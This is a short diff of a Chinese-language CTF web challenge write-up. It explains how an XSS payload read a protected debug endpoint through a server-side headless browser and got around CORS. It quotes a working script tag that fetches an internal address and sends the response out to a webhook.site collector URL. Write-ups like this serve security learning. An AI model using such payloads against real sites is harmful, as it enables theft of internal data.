@@ -35,7 +35,7 @@ debug接口有鉴权，访问不成功了，emm,现在可以知道的是，请�
 <script>fetch("http://49.232.142.230:12327/").then((data) => fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?c=".concat(JSON.stringify(data))));</script>
 ```
 
-在 CTF 中通过 `` + `fetch()` 成功读取并 exfiltrate 敏感 response 内容，是因为你的代码在服务端无头浏览器（如 puppeteer）中运行，**绕过了浏览器原本的 CORS 限制。**
+在 CTF 中通过 `` + `fetch()` 成功读取并 exfiltrate 敏感 response 内容，是因为代码在服务端无头浏览器中运行，**绕过了浏览器原本的 CORS 限制。**
 
 ![web-5.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.2.png)
 
